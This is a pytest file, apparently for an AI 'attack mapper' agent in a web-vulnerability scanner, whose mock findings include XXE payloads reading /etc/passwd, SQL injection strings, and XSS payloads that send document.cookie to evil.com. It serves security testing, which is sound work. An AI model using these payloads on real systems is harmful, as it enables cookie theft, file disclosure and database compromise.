import pytest
from collections import deque
from dotenv import load_dotenv
from custom_agents.attack_mapper.attack_mapper import run_attack_mapper_agent
from schema.common import FinalTestingResult, FinalParamResult, ParamResultList, ResultType
from schema.open_redirect import OpenRedirectParamResult, RedirectType
from schema.xss import XSSParamResult, XSSType
from schema.xxe import XXEResult, Severity, XXEDetectionMethod
from schema.sqli import SQLiResult, SQLiType
from main import init_db, initialize_new_session
from unittest.mock import patch

# Helper functions
def set_up_session():
    load_dotenv()
    init_db()
    return initialize_new_session(deque())

def get_response(test_list):
    with patch("builtins.input", side_effect=["test", "test"]):
        sess_id = set_up_session()
        response = run_attack_mapper_agent(test_list, session_id=sess_id)

    return response

# Test files
def test_empty_list():
    # Empty list of testing
    response = get_response([])
    assert not response.attack_vector_found, f"Empty: Found an attack vector"

def test_no_vector():
    test_list = [
        FinalTestingResult(
            endpoint="https://evil.com/upload",
            final_param_result_list={
                "file": [
                    FinalParamResult(
                        result_type=ResultType.BASIC,
                        param_result_list=ParamResultList(
                            param_result_list=[
                                XXEResult(
                                    endpoint_url="https://evil.com/upload",
                                    method="POST",
                                    param="file",
                                    payload="<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///nonexistent'>]>",
                                    vulnerable=False,
                                    severity=Severity.LOW,
                                    detection_method=XXEDetectionMethod.PARSER_ERROR,
                                    notes="Parser threw error; no file read."
                                )
                            ]
                        )
                    )
                ]
            }
        ),
        FinalTestingResult(
            endpoint="https://evil.com/profile",
            final_param_result_list={
                "bio": [
                    FinalParamResult(
                        result_type=ResultType.BASIC,
                        param_result_list=ParamResultList(
                            param_result_list=[
                                XSSParamResult(
                                    endpoint_url="https://evil.com/profile",
                                    method="POST",
                                    param="bio",
                                    payload="<script>alert(1)</script>",
                                    potentially_vulnerable=False,
                                    xss_type=XSSType.REFLECTED,
                                    notes="Escaped properly."
                                )
                            ]
                        )
                    )
                ]
            }
        )
    ]

    response = get_response(test_list=test_list)
    assert not response.attack_vector_found, f"NoVector: Found an attack vector"

def test_xxe_sqli():
    test_list = [
        FinalTestingResult(
            endpoint="https://evil.com/api/xmlupload",
            final_param_result_list={
                "data": [
                    FinalParamResult(
                        result_type=ResultType.BASIC,
                        param_result_list=ParamResultList(
                            param_result_list=[
                                XXEResult(
                                    endpoint_url="https://evil.com/api/xmlupload",
                                    method="POST",
                                    param="data",
                                    payload='<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
                                    vulnerable=True,
                                    severity=Severity.HIGH,
                                    detection_method=XXEDetectionMethod.FILE_READ,
                                    notes="Able to read system files, including /etc/passwd."
                                )
                            ]
                        )
                    )
                ]
            }
        ),
        FinalTestingResult(
            endpoint="https://evil.com/api/userinfo",
            final_param_result_list={
                "user_id": [
                    FinalParamResult(
                        result_type=ResultType.ADVANCED,
                        param_result_list=ParamResultList(
                            param_result_list=[
                                SQLiResult(
                                    url="https://evil.com/api/userinfo",
                                    method="GET",
                                    param="user_id",
                                    payload="' OR '1'='1",
                                    potentially_vulnerable=True,
                                    sqli_type=SQLiType.CLASSIC,
                                    notes="Leaked user data using classic SQLi."
                                )
                            ]
                        )
                    )
                ]
            }
        )
    ]

    response = get_response(test_list=test_list)
    assert response.attack_vector_found, f"XXE->SQLI: Found no attack vector"

    print(response.display_attack())

def test_redirect_xss():
    test_list = [
        FinalTestingResult(
            endpoint="https://evil.com/redirect",
            final_param_result_list={
                "next": [
                    FinalParamResult(
                        result_type=ResultType.BASIC,
                        param_result_list=ParamResultList(
                            param_result_list=[
                                OpenRedirectParamResult(
                                    endpoint_url="https://evil.com/redirect",
                                    method="GET",
                                    param="next",
                                    payload="https://evil.com",
                                    potentially_vulnerable=True,
                                    redirect_type=RedirectType.LOCATION_HEADER,
                                    notes="Redirects to arbitrary external domains including evil.com."
                                )
                            ]
                        )
                    )
                ]
            }
        ),
        FinalTestingResult(
            endpoint="https://evil.com/dashboard",
            final_param_result_list={
                "message": [
                    FinalParamResult(
                        result_type=ResultType.BASIC,
                        param_result_list=ParamResultList(
                            param_result_list=[
                                XSSParamResult(
                                    endpoint_url="https://evil.com/dashboard",
                                    method="GET",
                                    param="message",
                                    payload="<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>",
                                    potentially_vulnerable=True,
                                    xss_type=XSSType.REFLECTED,
                                    notes="Payload is reflected into the DOM without sanitization."
                                )
                            ]
                        )
                    )
                ]
            }
        )
    ]

    response = get_response(test_list=test_list)
    assert response.attack_vector_found, f"Redirect->XSS: Found no attack vector"

    print(response.display_attack())

def test_sqli_xss():
    test_list = [
        FinalTestingResult(
            endpoint="https://evil.com/comments/add",
            final_param_result_list={
                "comment": [
                    FinalParamResult(
                        result_type=ResultType.ADVANCED,
                        param_result_list=ParamResultList(
                            param_result_list=[
                                SQLiResult(
                                    url="https://evil.com/comments/add",
                                    method="POST",
                                    param="user_id",
                                    payload="1; INSERT INTO comments (msg) VALUES ('<script>fetch(\"https://evil.com/steal?cookie=\"+document.cookie)</script>') --",
                                    potentially_vulnerable=True,
                                    sqli_type=SQLiType.STACKED_QUERIES,
                                    notes="Able to inject a malicious stored XSS payload into comments table."
                                )
                            ]
                        )
                    )
                ]
            }
        ),
        FinalTestingResult(
            endpoint="https://evil.com/comments/view",
            final_param_result_list={
                "post_id": [
                    FinalParamResult(
                        result_type=ResultType.BASIC,
                        param_result_list=ParamResultList(
                            param_result_list=[
                                XSSParamResult(
                                    endpoint_url="https://evil.com/comments/view",
                                    method="GET",
                                    param="post_id",
                                    payload="<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>",
                                    potentially_vulnerable=True,
                                    xss_type=XSSType.STORED,
                                    notes="Malicious payload from database rendered into page."
                                )
                            ]
                        )
                    )
                ]
            }
        )
    ]

    response = get_response(test_list=test_list)
    assert response.attack_vector_found, f"SQLI->XSS: Found no attack vector"
    
    print(response.display_attack())

def test_redirect_sqli():
    test_list = [
        FinalTestingResult(
            endpoint="https://evil.com/login",
            final_param_result_list={
                "redirect_to": [
                    FinalParamResult(
                        result_type=ResultType.BASIC,
                        param_result_list=ParamResultList(
                            param_result_list=[
                                OpenRedirectParamResult(
                                    endpoint_url="https://evil.com/login",
                                    method="POST",
                                    param="redirect_to",
                                    payload="https://evil.com",
                                    potentially_vulnerable=True,
                                    redirect_type=RedirectType.LOCATION_HEADER,
                                    notes="Used after login to redirect user to evil.com"
                                )
                            ]
                        )
                    )
                ],
                "username": [
                    FinalParamResult(
                        result_type=ResultType.ADVANCED,
                        param_result_list=ParamResultList(
                            param_result_list=[
                                SQLiResult(
                                    url="https://evil.com/login",
                                    method="POST",
                                    param="username",
                                    payload="' OR '1'='1",
                                    potentially_vulnerable=True,
                                    sqli_type=SQLiType.CLASSIC,
                                    notes="Login bypass via classic SQLi"
                                )
                            ]
                        )
                    )
                ]
            }
        )
    ]

    response = get_response(test_list=test_list)
    assert response.attack_vector_found, f"Redirect->SQLI: Found no attack vector"

    print(response.display_attack())

def run_all_test():
    test_empty_list()
    test_no_vector()
    test_xxe_sqli()
    test_redirect_xss()
    test_sqli_xss()
    test_redirect_sqli()